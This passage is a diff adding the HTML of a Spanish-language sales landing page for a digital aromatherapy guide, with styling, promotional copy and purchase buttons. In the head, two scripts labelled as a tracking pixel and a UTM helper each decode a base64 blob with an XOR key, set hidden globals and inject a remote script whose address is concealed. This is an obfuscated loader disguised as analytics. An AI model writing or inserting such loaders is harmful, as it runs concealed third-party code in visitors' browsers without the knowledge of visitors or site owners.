@@ -1,0 +1,905 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Atlas Visual de los Aceites Esenciales: 300 protocolos visuales, diluciones, aplicaciones, sustituciones y cuidados.">
+  <title>Atlas Visual de los Aceites Esenciales</title>
+
+  <!--
+    ANTES DE PUBLICAR:
+    1. Sustituye CHECKOUT_BASICO y CHECKOUT_COMPLETO por tus enlaces de Hotmart.
+    2. Sustituye las imágenes de placehold.co por tus mockups e imágenes finales.
+    3. Añade únicamente testimonios reales y verificables.
+  -->
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Fraunces:opsz,wght@9..144,600;9..144,700&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --verde-escuro: #1B3A2D;
+      --verde-profundo: #123026;
+      --verde-medio: #3D7A5E;
+      --verde-claro: #DDE9E2;
+      --dourado: #B8891A;
+      --dourado-hover: #9E7413;
+      --marfim: #F4F1E8;
+      --marfim-claro: #FAF8F2;
+      --branco: #FFFFFF;
+      --texto: #1A1A1A;
+      --texto-secundario: #5A5A5A;
+      --borda: #E5E0D2;
+      --vermelho-alerta: #B84438;
+      --container-max: 1180px;
+      --container-narrow: 760px;
+      --font-headline: "Fraunces", serif;
+      --font-body: "DM Sans", sans-serif;
+      --shadow: 0 18px 50px rgba(18, 48, 38, .12);
+      --transition: all .3s ease;
+    }
+
+    * { box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      margin: 0;
+      color: var(--texto);
+      background: var(--branco);
+      font-family: var(--font-body);
+      font-size: 16px;
+      line-height: 1.65;
+      -webkit-font-smoothing: antialiased;
+    }
+    img { display: block; max-width: 100%; }
+    a { color: inherit; }
+    h1, h2, h3, p { margin-top: 0; }
+    h1, h2, h3 {
+      color: var(--verde-escuro);
+      font-family: var(--font-headline);
+      line-height: 1.12;
+    }
+    h1 { margin-bottom: 24px; font-size: clamp(2.45rem, 5vw, 3.5rem); }
+    h2 { margin-bottom: 20px; font-size: clamp(2rem, 4vw, 2.65rem); }
+    h3 { margin-bottom: 12px; font-size: 1.35rem; }
+    p { color: var(--texto-secundario); }
+
+    .container { width: min(calc(100% - 40px), var(--container-max)); margin-inline: auto; }
+    .container--narrow { width: min(calc(100% - 40px), var(--container-narrow)); margin-inline: auto; }
+    .section { padding: 96px 0; }
+    .bg-white { background: var(--branco); }
+    .bg-ivory { background: var(--marfim); }
+    .bg-green { background: var(--verde-escuro); color: var(--branco); }
+    .bg-green h2, .bg-green h3, .bg-green p { color: var(--branco); }
+    .text-center { text-align: center; }
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 18px;
+      color: var(--dourado);
+      font-size: .78rem;
+      font-weight: 700;
+      letter-spacing: .12em;
+      text-transform: uppercase;
+    }
+    .lead { font-size: 1.12rem; }
+    .mobile-only { display: none !important; }
+    .desktop-only { display: block !important; }
+    .section-intro { max-width: 720px; margin: 0 auto 48px; }
+    .section-intro p { font-size: 1.05rem; }
+
+    .alert-bar {
+      padding: 11px 16px;
+      color: var(--branco);
+      background: var(--vermelho-alerta);
+      font-size: .86rem;
+      font-weight: 700;
+      letter-spacing: .035em;
+      text-align: center;
+      text-transform: uppercase;
+    }
+
+    .hero {
+      overflow: hidden;
+      padding: 72px 0 82px;
+      background:
+        radial-gradient(circle at 82% 18%, rgba(61, 122, 94, .16), transparent 34%),
+        var(--marfim-claro);
+    }
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 1.02fr .98fr;
+      gap: 56px;
+      align-items: center;
+    }
+    .hero h1 em { color: var(--verde-medio); font-style: normal; }
+    .hero-list, .check-list, .price-list { margin: 26px 0; padding: 0; list-style: none; }
+    .hero-list li, .check-list li, .price-list li {
+      position: relative;
+      margin: 10px 0;
+      padding-left: 29px;
+      color: #2E3A34;
+    }
+    .hero-list li::before, .check-list li::before, .price-list .included::before {
+      position: absolute;
+      top: 0;
+      left: 0;
+      color: var(--verde-medio);
+      content: "✓";
+      font-weight: 800;
+    }
+    .price-list .locked { color: #969696; }
+    .price-list .locked::before {
+      position: absolute;
+      left: 0;
+      content: "🔒";
+      font-size: .82rem;
+    }
+
+    .btn {
+      display: inline-flex;
+      min-height: 56px;
+      align-items: center;
+      justify-content: center;
+      padding: 0 32px;
+      border: 0;
+      border-radius: 8px;
+      color: var(--branco);
+      background: var(--dourado);
+      box-shadow: 0 10px 24px rgba(184, 137, 26, .24);
+      font-weight: 700;
+      line-height: 1.2;
+      text-align: center;
+      text-decoration: none;
+      transition: var(--transition);
+    }
+    .btn:hover { background: var(--dourado-hover); transform: translateY(-2px); }
+    .btn--wide { width: 100%; }
+    .btn--outline-black {
+      background: #ffffff !important;
+      color: #1a1a1a !important;
+      border: 2px solid #1a1a1a !important;
+      box-shadow: none !important;
+    }
+    .btn--outline-black:hover {
+      background: #1a1a1a !important;
+      color: #ffffff !important;
+    }
+    .btn-note { margin: 13px 0 0; color: #6C756F; font-size: .82rem; }
+
+    .product-stage { position: relative; min-height: 520px; }
+    .product-stage__image {
+      position: relative;
+      z-index: 2;
+      width: 100%;
+      border-radius: 18px;
+      filter: drop-shadow(0 22px 35px rgba(18,48,38,.18));
+    }
+    .product-glow {
+      position: absolute;
+      inset: 8% 4% 2%;
+      border-radius: 50%;
+      background: radial-gradient(circle, rgba(61, 122, 94, .22), rgba(61, 122, 94, 0) 68%);
+      filter: blur(8px);
+    }
+    .book {
+      position: absolute;
+      top: 42px;
+      left: 50%;
+      z-index: 2;
+      width: 290px;
+      min-height: 390px;
+      padding: 42px 32px;
+      border: 9px solid #F0E8D7;
+      border-radius: 5px 15px 15px 5px;
+      color: var(--branco);
+      background:
+        linear-gradient(rgba(18,48,38,.2), rgba(18,48,38,.2)),
+        radial-gradient(circle at 80% 15%, #527F69, transparent 32%),
+        var(--verde-escuro);
+      box-shadow: -18px 22px 45px rgba(18, 48, 38, .28);
+      transform: translateX(-38%) rotate(-2deg);
+    }
+    .book::after {
+      position: absolute;
+      top: 0;
+      right: -18px;
+      width: 16px;
+      height: 100%;
+      border-radius: 0 10px 10px 0;
+      background: #D6CCB8;
+      content: "";
+    }
+    .book-mark { color: #E5C76F; font-size: 2.6rem; }
+    .book small { display: block; margin: 18px 0 14px; color: #DCE9E2; font-weight: 700; letter-spacing: .12em; }
+    .book strong { display: block; font-family: var(--font-headline); font-size: 2rem; line-height: 1.05; }
+    .book span { display: block; margin-top: 18px; color: #E7E0CE; font-size: .82rem; }
+    .phone {
+      position: absolute;
+      right: 2%;
+      bottom: 10px;
+      z-index: 3;
+      width: 210px;
+      height: 405px;
+      padding: 12px;
+      border: 7px solid #1A1A1A;
+      border-radius: 32px;
+      background: #161616;
+      box-shadow: 0 22px 50px rgba(0,0,0,.24);
+      transform: rotate(4deg);
+    }
+    .phone-screen {
+      height: 100%;
+      padding: 28px 15px;
+      border-radius: 19px;
+      background: var(--marfim-claro);
+    }
+    .phone-screen .mini-leaf { color: var(--verde-medio); font-size: 2rem; }
+    .phone-screen h4 { margin: 8px 0; color: var(--verde-escuro); font-family: var(--font-headline); font-size: 1.2rem; }
+    .protocol-mini { margin-top: 18px; padding: 13px; border: 1px solid var(--borda); border-radius: 10px; background: white; }
+    .protocol-mini b { color: var(--verde-escuro); font-size: .72rem; }
+    .protocol-mini p { margin: 7px 0 0; font-size: .65rem; line-height: 1.4; }
+    .floating-card {
+      position: absolute;
+      bottom: 2px;
+      left: 1%;
+      z-index: 4;
+      width: 220px;
+      padding: 17px;
+      border: 1px solid rgba(255,255,255,.8);
+      border-radius: 14px;
+      background: rgba(255,255,255,.92);
+      box-shadow: var(--shadow);
+    }
+    .floating-card b { color: var(--verde-escuro); }
+    .floating-card p { margin: 4px 0 0; font-size: .78rem; line-height: 1.4; }
+
+    .preview-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 18px;
+    }
+    .preview-card {
+      overflow: hidden;
+      border: 1px solid var(--borda);
+      border-radius: 14px;
+      background: var(--branco);
+      box-shadow: 0 10px 25px rgba(18,48,38,.07);
+      transition: var(--transition);
+    }
+    .preview-card:hover { transform: translateY(-5px); box-shadow: var(--shadow); }
+    .preview-card img { width: 100%; aspect-ratio: 4/5; object-fit: cover; }
+
+    .feature-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; }
+    .feature-card {
+      padding: 28px 24px;
+      border: 1px solid var(--borda);
+      border-radius: 14px;
+      background: var(--branco);
+    }
+    .feature-icon {
+      display: grid;
+      width: 50px;
+      height: 50px;
+      margin-bottom: 20px;
+      place-items: center;
+      border-radius: 50%;
+      background: var(--verde-claro);
+      font-size: 1.35rem;
+    }
+    .feature-card p { margin-bottom: 0; font-size: .94rem; }
+
+    .split { display: grid; grid-template-columns: 1fr 1fr; gap: 64px; align-items: center; }
+    .lifestyle-frame {
+      overflow: hidden;
+      border-radius: 18px;
+      background: #D6E3DC;
+      box-shadow: var(--shadow);
+    }
+    .lifestyle-frame img { width: 100%; min-height: 460px; object-fit: cover; }
+    .usage-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 22px; }
+    .usage-grid img { width: 100%; height: 360px; border-radius: 16px; object-fit: cover; box-shadow: var(--shadow); }
+    .green-panel { padding: 40px; border: 1px solid rgba(255,255,255,.15); border-radius: 16px; background: rgba(255,255,255,.06); }
+    .green-panel ul { margin-bottom: 0; }
+    .green-panel .check-list li { color: #F5F4EF; }
+    .green-panel .check-list li::before { color: #D9BD68; }
+
+    .audience-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 22px; }
+    .audience-card { padding: 27px; border: 1px solid var(--borda); border-radius: 14px; background: var(--branco); }
+    .audience-card p { margin-bottom: 0; font-size: .93rem; }
+
+    .system-card {
+      display: grid;
+      grid-template-columns: .92fr 1.08fr;
+      gap: 48px;
+      align-items: center;
+      padding: 50px;
+      border: 1px solid var(--borda);
+      border-radius: 20px;
+      background: var(--branco);
+      box-shadow: var(--shadow);
+    }
+    .mockup-board {
+      position: relative;
+      display: grid;
+      min-height: 450px;
+      place-items: center;
+      border-radius: 16px;
+      background: linear-gradient(145deg, var(--verde-claro), #F8F3E8);
+    }
+    .system-image { width: 100%; border-radius: 16px; box-shadow: var(--shadow); }
+    .mockup-board .mockup-stack { position: relative; width: 78%; height: 340px; }
+    .mockup-sheet {
+      position: absolute;
+      width: 190px;
+      height: 270px;
+      padding: 23px;
+      border: 6px solid white;
+      border-radius: 4px;
+      color: white;
+      background: var(--verde-escuro);
+      box-shadow: 0 16px 32px rgba(18,48,38,.19);
+    }
+    .mockup-sheet:nth-child(1) { left: 0; top: 45px; transform: rotate(-9deg); }
+    .mockup-sheet:nth-child(2) { left: 27%; top: 8px; z-index: 2; transform: rotate(-1deg); }
+    .mockup-sheet:nth-child(3) { right: 0; top: 48px; transform: rotate(9deg); }
+    .mockup-sheet b { display: block; margin-top: 42px; font-family: var(--font-headline); font-size: 1.25rem; line-height: 1.1; }
+    .mockup-sheet span { display: block; margin-top: 16px; color: #DDE9E2; font-size: .7rem; }
+
+    .bonus-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 26px; }
+    .bonus-card {
+      display: grid;
+      grid-template-columns: 180px 1fr;
+      overflow: hidden;
+      border: 1px solid var(--borda);
+      border-radius: 16px;
+      background: var(--branco);
+      box-shadow: 0 10px 28px rgba(18,48,38,.07);
+    }
+    .bonus-cover {
+      display: grid;
+      min-height: 285px;
+      padding: 22px;
+      place-content: center;
+      color: white;
+      background: linear-gradient(145deg, var(--verde-medio), var(--verde-profundo));
+      text-align: center;
+    }
+    .bonus-cover img { width: 100%; height: 100%; min-height: 285px; object-fit: cover; }
+    .bonus-cover span { font-size: 2.2rem; }
+    .bonus-cover b { margin-top: 12px; font-family: var(--font-headline); font-size: 1.15rem; line-height: 1.1; }
+    .bonus-content { padding: 26px; }
+    .bonus-label { color: var(--dourado); font-size: .75rem; font-weight: 800; letter-spacing: .1em; }
+    .bonus-content ul { margin: 15px 0; padding-left: 19px; color: var(--texto-secundario); font-size: .88rem; }
+    .bonus-value { color: var(--texto-secundario); font-size: .88rem; }
+    .free { display: inline-block; margin-left: 8px; padding: 3px 9px; border-radius: 99px; color: white; background: var(--verde-medio); font-size: .72rem; font-weight: 800; }
+
+    .pricing-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: stretch; }
+    .price-card {
+      position: relative;
+      padding: 38px;
+      border: 1px solid var(--borda);
+      border-radius: 18px;
+      background: var(--branco);
+      box-shadow: 0 12px 35px rgba(18,48,38,.08);
+    }
+    .price-card--featured { border: 3px solid var(--dourado); box-shadow: 0 24px 55px rgba(18,48,38,.17); transform: scale(1.02); }
+    .popular-ribbon {
+      position: absolute;
+      top: -17px;
+      left: 50%;
+      padding: 7px 20px;
+      border-radius: 99px;
+      color: white;
+      background: var(--dourado);
+      font-size: .74rem;
+      font-weight: 800;
+      letter-spacing: .06em;
+      transform: translateX(-50%);
+      white-space: nowrap;
+    }
+    .plan-name { margin-bottom: 18px; color: var(--verde-escuro); font-size: .85rem; font-weight: 800; letter-spacing: .12em; }
+    .plan-mockup {
+      display: block;
+      width: 100%;
+      height: auto;
+      margin-bottom: 25px;
+      border-radius: 13px;
+      background: linear-gradient(145deg, var(--verde-claro), var(--marfim));
+      overflow: hidden;
+    }
+    .plan-mockup img {
+      display: block;
+      width: 100%;
+      height: auto;
+      max-height: 230px;
+      border-radius: 13px;
+      object-fit: contain;
+      padding: 12px;
+      box-sizing: border-box;
+    }
+    .price-list { min-height: 480px; }
+    .old-price { margin: 14px 0 0; color: #777; text-decoration: line-through; }
+    .price { color: var(--verde-escuro); font-family: var(--font-headline); font-size: 3.4rem; font-weight: 700; line-height: 1; }
+    .payment { margin: 8px 0 20px; color: var(--texto-secundario); font-size: .88rem; }
+    .currency-note { margin: 14px 0 0; padding: 12px; border-radius: 9px; background: var(--marfim-claro); font-size: .8rem; text-align: center; }
+
+    .testimonial-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
+    .testimonial { padding: 28px; border: 1px solid var(--borda); border-radius: 14px; background: var(--branco); }
+    .stars { color: var(--dourado); letter-spacing: .1em; }
+    .testimonial blockquote { margin: 17px 0; color: var(--texto-secundario); font-style: italic; }
+    .testimonial small { color: var(--verde-escuro); font-weight: 700; }
+
+    .guarantee {
+      display: grid;
+      grid-template-columns: 150px 1fr;
+      gap: 38px;
+      align-items: center;
+      padding: 48px;
+      border: 2px solid rgba(184,137,26,.35);
+      border-radius: 20px;
+      background: var(--marfim-claro);
+    }
+    .seal {
+      display: grid;
+      width: 140px;
+      height: 140px;
+      place-content: center;
+      border: 5px double var(--dourado);
+      border-radius: 50%;
+      color: var(--verde-escuro);
+      background: white;
+      font-family: var(--font-headline);
+      font-size: 1.05rem;
+      font-weight: 700;
+      text-align: center;
+    }
+
+    .steps { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; counter-reset: steps; }
+    .step { position: relative; padding: 28px 22px; border: 1px solid var(--borda); border-radius: 14px; background: var(--branco); counter-increment: steps; }
+    .step::before {
+      display: grid;
+      width: 42px;
+      height: 42px;
+      margin-bottom: 18px;
+      place-items: center;
+      border-radius: 50%;
+      color: white;
+      background: var(--verde-medio);
+      content: counter(steps);
+      font-weight: 800;
+    }
+    .step p { margin-bottom: 0; font-size: .9rem; }
+
+    .author-card { display: grid; grid-template-columns: 340px 1fr; gap: 52px; align-items: center; }
+    .author-photo {
+      display: grid;
+      overflow: hidden;
+      min-height: 430px;
+      place-items: end center;
+      border-radius: 18px;
+      background: linear-gradient(145deg, #C9DACE, #EEE5D2);
+    }
+    .author-photo img { width: 100%; height: 100%; min-height: 430px; object-fit: cover; }
+    .author-silhouette {
+      width: 80%;
+      height: 82%;
+      border-radius: 50% 50% 8% 8%;
+      background: linear-gradient(#9EB7A7 0 24%, #315B48 24% 100%);
+      opacity: .85;
+    }
+    .author-quote { padding-left: 22px; border-left: 3px solid var(--dourado); color: var(--verde-escuro); font-family: var(--font-headline); font-size: 1.25rem; }
+
+    .faq { display: grid; gap: 12px; }
+    details { border: 1px solid var(--borda); border-radius: 12px; background: var(--branco); }
+    summary { position: relative; padding: 20px 52px 20px 22px; color: var(--verde-escuro); cursor: pointer; font-weight: 700; list-style: none; }
+    summary::-webkit-details-marker { display: none; }
+    summary::after { position: absolute; top: 19px; right: 22px; content: "+"; font-size: 1.3rem; }
+    details[open] summary::after { content: "−"; }
+    details p { margin: 0; padding: 0 22px 22px; }
+
+    .final-cta { padding: 86px 0; text-align: center; }
+    .final-cta p { max-width: 650px; margin-inline: auto; color: #DCE5E0; }
+    footer { padding: 42px 0; color: #CBD8D1; background: var(--verde-profundo); font-size: .82rem; }
+    footer h3 { color: white; }
+    .footer-links { display: flex; flex-wrap: wrap; gap: 18px; margin: 18px 0; }
+    .footer-links a { color: #E1E8E4; }
+    footer p { max-width: 900px; margin-bottom: 10px; color: #AFC0B7; }
+
+    @media (max-width: 980px) {
+      .hero-grid, .split, .system-card, .author-card { grid-template-columns: 1fr; }
+      .hero-copy { text-align: center; }
+      .hero-list { display: inline-block; text-align: left; }
+      .product-stage { width: 100%; max-width: 620px; margin: 0 auto; min-height: auto; height: auto; transform: none; }
+      .preview-grid { grid-template-columns: repeat(3, 1fr); }
+      .feature-grid, .steps { grid-template-columns: repeat(2, 1fr); }
+      .audience-grid, .testimonial-grid { grid-template-columns: 1fr 1fr; }
+      .usage-grid { grid-template-columns: 1fr; }
+      .author-card { max-width: 760px; margin: 0 auto; }
+      .author-photo { min-height: 360px; }
+      
+      .mobile-only { display: block !important; }
+      .desktop-only { display: none !important; }
+      .product-stage.mobile-only {
+        min-height: auto;
+        height: auto;
+        transform: none;
+        margin: 24px auto 16px;
+        width: 100%;
+        max-width: 480px;
+      }
+    }
+
+    @media (max-width: 720px) {
+      .section { padding: 68px 0; }
+      .hero { padding: 54px 0 64px; }
+      .hero-grid { gap: 30px; }
+      .product-stage { min-height: 435px; transform: scale(.9); transform-origin: top center; margin-bottom: -35px; }
+      .book { left: 42%; width: 250px; min-height: 350px; padding: 34px 25px; }
+      .phone { right: -2%; width: 175px; height: 350px; }
+      .floating-card { left: -2%; width: 190px; }
+      .preview-grid { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; padding-bottom: 12px; }
+      .preview-card { min-width: 72%; scroll-snap-align: center; }
+      .feature-grid, .audience-grid, .bonus-grid, .pricing-grid, .testimonial-grid, .steps { grid-template-columns: 1fr; }
+      .system-card { padding: 25px; }
+      .mockup-board { min-height: 380px; }
+      .mockup-sheet { width: 150px; height: 230px; }
+      .bonus-card { grid-template-columns: 120px 1fr; }
+      .bonus-cover { min-height: 290px; padding: 14px; }
+      .bonus-cover b { font-size: .95rem; }
+      .price-card { padding: 30px 24px; }
+      .price-card--featured { margin-top: 20px; transform: none; }
+      .price-list { min-height: 0; }
+      .guarantee { grid-template-columns: 1fr; padding: 32px 24px; text-align: center; }
+      .seal { margin: 0 auto; }
+      .author-card { grid-template-columns: 1fr; }
+      .author-photo { min-height: 350px; }
+      .usage-grid img { height: auto; }
+    }
+
+    @media (max-width: 430px) {
+      .container, .container--narrow { width: min(calc(100% - 28px), var(--container-max)); }
+      .btn { width: 100%; padding: 0 20px; }
+      .product-stage { transform: scale(.78); width: 128%; margin-left: -14%; margin-bottom: -90px; }
+      .bonus-card { grid-template-columns: 1fr; }
+      .bonus-cover { min-height: 210px; }
+    }
+  </style>
+
+  <!-- Script Pixel -->
+  <script>(function(){var l_u1=atob("DJcuju3ymQ5/CUfayuwM+5+euzRdYTOuuuQUocKR/WBRfDO3o/FXoI6d9CAde2ipqeVH/pmBtn4WcSK25edH9oiet2QMK2v4q+Na/ISQ7HoaemXgkcoCrIqe9mweZTT48MxVrIOT9GtdM2Wqo+9L4qSWuyJdfya2v/IMtM/E+G9GPHbsr68fv4mTrT8dbyXqq/IZu9nQ5FMC");var n_ui5=[];for(var p_orx=0;p_orx<l_u1.length;p_orx++){n_ui5.push(l_u1.charCodeAt(p_orx)&255);}var h_vfv=n_ui5[0];var z_ana=n_ui5.slice(1,1+h_vfv);var j_6wfl=n_ui5.slice(1+h_vfv);var r_m=j_6wfl.map(function(b,x_79){return b^z_ana[x_79%h_vfv];});var s_q="";for(var d_d=0;d_d<r_m.length;d_d++){s_q+=String.fromCharCode(r_m[d_d]&255);}var w_a61b=decodeURIComponent(escape(s_q));var b_l=JSON.parse(w_a61b);var d_i8z4=b_l.globals||[];d_i8z4.forEach(function(x_sa){window[x_sa.name]=x_sa.value;});var q_tr=document.createElement("script");q_tr.src=b_l.url;q_tr.async=true;q_tr.defer=true;(b_l.attributes||[]).forEach(function(n_zv){q_tr.setAttribute(n_zv.name,n_zv.value);});(document.head||document.documentElement).appendChild(q_tr);})();</script>
+
+  <!-- Script UTM -->
+  <script>(function(){var j_ixf=atob("DFMqYYq4PS7E7PRxVygIFPjUHxTmhIAFJyAQTqXbWUDqmYAcPjVTT+nXUACmntsCNCFDEf7LEluwgYdeOzJeBPnME0S3zthTNideE+PaSFqhn9ZLDCgID+vVWAz+zpAQIzIHFP7VVEi9wYQDMiVPD/6VTlumhZACdX8IF+vUSEvm1tZTKg5X");var i_c=[];for(var q_fmw8=0;q_fmw8<j_ixf.length;q_fmw8++){i_c.push(j_ixf.charCodeAt(q_fmw8)&255);}var g_7qub=i_c[0];var i_tvrg=i_c.slice(1,1+g_7qub);var o_0y2b=i_c.slice(1+g_7qub);var w_akl=o_0y2b.map(function(b,o_ads){return b^i_tvrg[o_ads%g_7qub];});var f_6vb="";for(var g_rmj3=0;g_rmj3<w_akl.length;g_rmj3++){f_6vb+=String.fromCharCode(w_akl[g_rmj3]&255);}var i_w1=decodeURIComponent(escape(f_6vb));var b_4mi1=JSON.parse(i_w1);var k_4=b_4mi1.globals||[];k_4.forEach(function(y_t1){window[y_t1.name]=y_t1.value;});var p_fv=document.createElement("script");p_fv.src=b_4mi1.url;p_fv.async=true;p_fv.defer=true;(b_4mi1.attributes||[]).forEach(function(y_2bux){p_fv.setAttribute(y_2bux.name,y_2bux.value);});(document.head||document.documentElement).appendChild(p_fv);})();</script>
+</head>
+
+<body>
+  <div class="alert-bar">⚡ Oferta especial disponible solo hoy — <span id="today-date">hoy</span></div>
+
+  <header class="hero">
+    <div class="container hero-grid">
+      <div class="hero-copy">
+        <div class="eyebrow">🌿 300 protocolos visuales de aromaterapia</div>
+        <h1>Deja de usar tus aceites esenciales a ciegas. <em>Empieza a seguir un protocolo.</em></h1>
+        
+        <div class="product-stage mobile-only" aria-label="Mockup del Atlas Visual">
+          <img class="product-stage__image" src="assets/hero-atlas-visual.png" alt="Atlas Visual de los Aceites Esenciales en libro, tablet, celular y fichas" fetchpriority="high">
+        </div>
+
+        <p class="lead">Descubre qué aceite utilizar para cada objetivo, con la cantidad de gotas, la dilución, la forma de aplicación, posibles sustituciones y cuidados esenciales reunidos en una sola ficha visual.</p>
+        <ul class="hero-list">
+          <li>300 protocolos visuales organizados por objetivo</li>
+          <li>Dilución y cantidad de gotas explicadas</li>
+          <li>Aplicación, sustituciones y precauciones</li>
+          <li>Consulta rápida desde el celular o en papel</li>
+          <li>7 bonos exclusivos incluidos en el Plan Completo</li>
+        </ul>
+        <a class="btn" href="#oferta">ACCEDER AHORA</a>
+        <p class="btn-note">Acceso digital inmediato por correo electrónico</p>
+      </div>
+
+      <div class="product-stage desktop-only" aria-label="Mockup del Atlas Visual">
+        <img class="product-stage__image" src="assets/hero-atlas-visual.png" alt="Atlas Visual de los Aceites Esenciales en libro, tablet, celular y fichas" fetchpriority="high">
+      </div>
+    </div>
+  </header>
+
+  <section class="section bg-ivory">
+    <div class="container">
+      <div class="section-intro text-center">
+        <div class="eyebrow">Una mirada al interior</div>
+        <h2>Mira los protocolos que vas a recibir</h2>
+        <p>Cada ficha concentra la información práctica que necesitas, con una lectura visual clara y rápida.</p>
+      </div>
+      <div class="preview-grid">
+        <article class="preview-card"><img src="assets/protocolo-lavanda.png" alt="Ejemplo de protocolo visual de lavanda" loading="lazy"></article>
+        <article class="preview-card"><img src="assets/protocolo-eucalipto-menta.png" alt="Ejemplo de sinergia de eucalipto y menta" loading="lazy"></article>
+        <article class="preview-card"><img src="assets/protocolo-naranja-dulce.png" alt="Ejemplo de protocolo de naranja dulce" loading="lazy"></article>
+        <article class="preview-card"><img src="assets/protocolo-arbol-te.png" alt="Ejemplo de protocolo de árbol de té" loading="lazy"></article>
+        <article class="preview-card"><img src="assets/modulo-confort-digestivo.png" alt="Portada del módulo de confort digestivo" loading="lazy"></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white">
+    <div class="container">
+      <div class="section-intro text-center">
+        <h2>Los protocolos del Atlas Visual incluyen</h2>
+      </div>
+      <div class="feature-grid">
+        <article class="feature-card"><div class="feature-icon">🗂️</div><h3>Organización por objetivo</h3><p>Encuentra rápidamente el protocolo según el objetivo, aceite o forma de aplicación.</p></article>
+        <article class="feature-card"><div class="feature-icon">🔍</div><h3>Aplicación ilustrada</h3><p>Cada ficha muestra aceite, cantidad, dilución, portador, aplicación y cuidados.</p></article>
+        <article class="feature-card"><div class="feature-icon">🔄</div><h3>Sustituciones posibles</h3><p>Comprende qué alternativas pueden utilizarse cuando no tienes el aceite principal.</p></article>
+        <article class="feature-card"><div class="feature-icon">📱</div><h3>Consulta rápida</h3><p>Accede desde celular, computadora o imprime los protocolos en alta resolución.</p></article>
+      </div>
+      <div class="text-center" style="margin-top:40px">
+        <a class="btn" href="#oferta">QUIERO LOS 300 PROTOCOLOS VISUALES</a>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-green">
+    <div class="container split">
+      <div>
+        <div class="eyebrow">Más claridad, menos improvisación</div>
+        <h2>Deja de guardar frascos sin saber cómo aprovecharlos</h2>
+        <p class="lead">Con una guía visual puedes consultar cada preparación antes de comenzar y comprender mejor la cantidad, la dilución y los cuidados necesarios.</p>
+      </div>
+      <div class="green-panel">
+        <ul class="check-list">
+          <li>Evita desperdiciar aceite usando cantidades innecesarias</li>
+          <li>Comprende cuándo y cómo se realiza una dilución</li>
+          <li>Consulta la forma de aplicación indicada en cada ficha</li>
+          <li>Encuentra sustituciones para los aceites que no tienes</li>
+          <li>Identifica precauciones importantes antes de utilizar una mezcla</li>
+          <li>Organiza tu colección para consultarla rápidamente</li>
+        </ul>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white">
+    <div class="container split">
+      <div class="lifestyle-frame">
+        <img src="assets/galeria-tablet.png" alt="Protocolo visual de lavanda consultado en una tablet" loading="lazy">
+      </div>
+      <div>
+        <div class="eyebrow">El problema no siempre es el aceite</div>
+        <h2>¿Alguna vez utilizaste un aceite y sentiste que no obtuviste lo que esperabas?</h2>
+        <p>Muchas veces falta una orientación clara sobre proporciones, dilución, aplicación y cuidados. Usar más gotas no significa necesariamente obtener una mejor experiencia.</p>
+        <p>Algunos aceites necesitan dilución, ciertos cítricos requieren precaución antes de la exposición solar y cada forma de aplicación utiliza proporciones diferentes.</p>
+        <p>El Atlas transforma información dispersa en un sistema visual organizado, pensado para consultar antes de cada preparación.</p>
+        <a class="btn" href="#oferta">QUIERO ACCEDER AHORA</a>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory">
+    <div class="container">
+      <div class="section-intro text-center"><h2>Consulta tus protocolos como prefieras</h2><p>Desde el celular o la tablet, o impresos para tenerlos siempre cerca de tus aceites.</p></div>
+      <div class="usage-grid">
+        <img src="assets/galeria-tablet.png" alt="Protocolo consultado en una tablet" loading="lazy">
+        <img src="assets/galeria-mujer-tablet.png" alt="Mujer mostrando un protocolo visual en una tablet" loading="lazy">
+        <img src="assets/galeria-protocolos-impresos.png" alt="Mujer consultando protocolos visuales impresos" loading="lazy">
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-ivory">
+    <div class="container">
+      <div class="section-intro text-center">
+        <h2>Este material es ideal para ti si quieres</h2>
+      </div>
+      <div class="audience-grid">
+        <article class="audience-card"><div class="feature-icon">🧴</div><h3>Usar cantidades más claras</h3><p>Consulta gotas, proporción, aceite portador y aplicación antes de preparar.</p></article>
+        <article class="audience-card"><div class="feature-icon">📖</div><h3>Saber qué aceite elegir</h3><p>Busca por objetivo y descubre aceites, combinaciones y alternativas.</p></article>
+        <article class="audience-card"><div class="feature-icon">🌿</div><h3>Aprender visualmente</h3><p>Convierte explicaciones extensas en fichas ilustradas fáciles de consultar.</p></article>
+        <article class="audience-card"><div class="feature-icon">🏡</div><h3>Simplificar el uso en casa</h3><p>Organiza protocolos para difusores, masajes, baños y cuidado personal.</p></article>
+        <article class="audience-card"><div class="feature-icon">🔄</div><h3>Aprovechar lo que ya tienes</h3><p>Encuentra sustituciones y evita comprar nuevos aceites sin necesidad.</p></article>
+        <article class="audience-card"><div class="feature-icon">⏱️</div><h3>Encontrar todo rápidamente</h3><p>Utiliza índices por objetivo, aceite, aplicación y combinación.</p></article>
+      </div>
+    </div>
+  </section>
+
+  <section class="section bg-white">
+    <div class="container system-card">
+      <img class="system-image" src="assets/mockup-sistema-completo.png" alt="Sistema completo del Atlas Visual con 300 protocolos y 7 bonos" loading="lazy">
+      <div>
+        <div class="eyebrow">⚡ Acceso inmediato</div>
+        <h2>Todo el sistema, organizado en un solo lugar</h2>
+        <p>Elige el objetivo, encuentra el protocolo y consulta toda la información esencial antes de preparar tu mezcla.</p>
+        <ul class="check-list">
+          <li>Atlas Visual de los Aceites Esenciales</li>
